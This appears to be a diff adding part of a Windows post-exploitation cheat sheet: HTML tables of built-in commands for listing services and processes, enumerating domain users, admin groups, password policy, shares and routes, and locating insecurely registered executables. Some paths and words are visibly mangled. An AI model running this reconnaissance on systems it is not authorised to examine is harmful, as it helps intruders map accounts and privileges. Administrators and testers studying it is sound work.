+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists services</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">-&gt; sc getkeyname “XXXXX”</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">You can use the name you got from ‘net start’ to get the ‘key name’ of the service you want more information on.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">–&gt; sc queryex “XXXXX”</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Using the keyname you achieved from ‘getkeyname’, you can query the status, pid and other information about the service.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net config workstation</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This will display information such as NetBIOS name, the full computer name, Username (of the user executing this command), Domain, Workgroups, and more.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net time</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net file</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net session</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Used to map network shares, such as the C: drive.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist (XP+)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Is equivalent to using Taskmanager, though visible as console output instead with PID’s too.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /m  or tasklist /m blah.dll</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all of the ‘modules’ (binary (exe, dll, com or any other PE based code that was executed) for each psportsportrocess, or if a module is specified then tasklist will only list the processes with that specific module running. Great for finding processes running crypto or other specific function dlls</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /svc</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists processes and their accompanying service </span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">keyname if they are parented by a service</span>
+</td></tr>
+<tr style="height: 56px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">taskkill [/f] /pid &lt;pid&gt;</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">taskkill [/f] /im &lt;image_name&gt;</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Kill processes by name or pid (with force option)</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">fsutil fsinfo drives</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Must be an administrator to run this, but it list the current drives on the system.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: white; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">reg query HKLM /s /d /f “C:* *.exe” | find /I “C:&quot; | find /V”“”&quot;</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Locates insecurely registered executablea within the system registry on Windows 7. </span>
+</td></tr>
+</tbody></table>
+
+<h2 id="networking-ipconfig-netstat-net"><a href="#TOC">Networking (ipconfig, netstat, net)</a></h2>
+<table style="border-collapse: collapse; border: medium none;">
+<colgroup><col width="333"></col><col width="339"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">ipconfig /all</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays the full information about your NIC’s.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">ipconfig /displaydns</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays your local DNS cache.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nabo</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -s -p [tcp|udp|icpm|ip]</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -r</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -na | findstr :445</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nao | findstr LISTENING</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">XP and up for -o flag to get PID</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nao | findstr LISTENING</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">XP and up for -o flag to get PID</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -na | findstr LISTENING</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh diag show all</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view /domain:otherdomain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user %USERNAME% /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all of the domain users</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net accounts</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the password policy for the local system. This can be different and superseded by the domain policy.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net accounts /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the password policy for the domain</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Administrators local group</span>
+</td></tr>
+<tr style="height: 73px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">as this was supposed to use localgroup &amp; domain, this actually another way of getting <em>current</em> domain admins</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Domain Admins” /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Domain Admins group</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Enterprise Admins” /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Enterprise Admins group</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Domain Controllers” /domain</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the list of Domain Controllers for the current domain</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">nbtstat -a [ip here]</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays your currently shared SMB entries, and what path(s) they point to.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net session | find / “\”</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">arp -a</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all the systems currently in the machine’s ARP table. </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">route print</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">browstat (Not working on XP)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+</tbody></table>
+
+<h2 id="configs"><a href="#TOC">Configs</a></h2>
+<table style="border-collapse: collapse; border: medium none;">
+<colgroup></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">gpresult /z</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Extremely verbose output of GPO (Group policy) settings as applied to the current system and user</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc qc</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc query</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc queryex</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">type %WINDIR%32</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Print the contents of the Windows hosts file</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir %PROGRAMFILES%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints a diretory listing of the Program Files directory.</span>
+</td></tr>
+<tr style="height: 49px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">echo %COMSPEC%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure.</span>
+</td></tr>
+</tbody></table>
+
+<h2 id="finding-important-files"><a href="#TOC">FINDING IMPORTANT FILES</a></h2>
+<table style="border-collapse: collapse; border: medium none; width: 624px;">
+<colgroup><col width="*"></col><col width="*"></col></colgroup>
+<tbody>
+<tr style="height: 32px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tree C: /f /a &gt; C:_of_tree.txt</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints a directory listing in ‘tree’ format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir /a</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir /b /s [Directory or Filename]</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir  /s /b | find /I “searchstring”</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Searches the output of dir from the root of the drive current drive () and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">command | find /c /v “”</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Counts the lines of whatever you use for ‘command’</span>
+</td></tr>
